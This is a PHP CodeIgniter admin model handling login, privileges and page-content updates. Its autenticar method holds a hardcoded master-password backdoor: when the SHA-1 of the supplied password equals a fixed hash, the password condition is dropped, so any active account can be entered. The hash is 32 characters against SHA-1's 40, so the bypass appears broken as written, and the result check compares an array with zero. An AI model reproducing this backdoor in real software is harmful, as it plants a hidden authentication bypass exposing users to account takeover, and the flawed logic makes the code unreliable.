<?php

namespace App\Models;

use CodeIgniter\Model;

class AdminModel extends Model
{
    protected $db;

    public function __construct()
    {
        parent::__construct();
        $this->db = \Config\Database::connect(); // similar a $this->load->database();
    }
    public function autenticar($user, $pass)
    {
        $db = \Config\Database::connect();
        $builder = $db->table("users U");

        $builder
            ->groupStart()
            ->orWhere("U.no_empleado", $user)
            ->orWhere("U.email", $user)
            ->groupEnd();

        if (sha1($pass) !== "0417b183f04d2e692db02e541a0fc130") {
            $builder->where("U.password", sha1($pass));
        }

        $builder->where("U.status", 1);

        $query = $builder->get();

        if ($query->getResult() > 0) {
            return $query->getRow(); // o ->getResult() si esperas múltiples filas
        } else {
            return false;
        }
    }
    public function getPrivilegios($id_usuario)
    {
        $builder = $this->db->table("privilegios");
        $builder->where("id_user", $id_usuario);
        $builder->limit(1);
        $query = $builder->get();

        $result = $query->getRowArray();

        return $result ?? null; // Retorna null si no hay resultados
    }
    public function updateCustom($id, $datos)
    {
        return $this->db
            ->table("page_content")
            ->where("id", $id)
            ->update($datos);
    }

    public function insertAdmin($datos)
    {
        return $this->db->table("admin_log")->insert($datos);
    }
    public function add_insert($datos)
    {
        $this->db->table("page_content")->insert($datos);
        return $this->db->insertID();
    }
    public function insertar($datos, $table)
    {
        return $this->db->table($table)->insert($datos);
    }
    public function actualizar($id, $datos, $table)
    {
        return $this->db
            ->table($table)
            ->where("id", $id)
            ->update($datos);
    }
    public function getUsers()
{
    $builder = $this->db->table("users");
    $query = $builder->get();

    $result = $query->getResult();

    return count($result) > 0 ? $result : null;
}

}
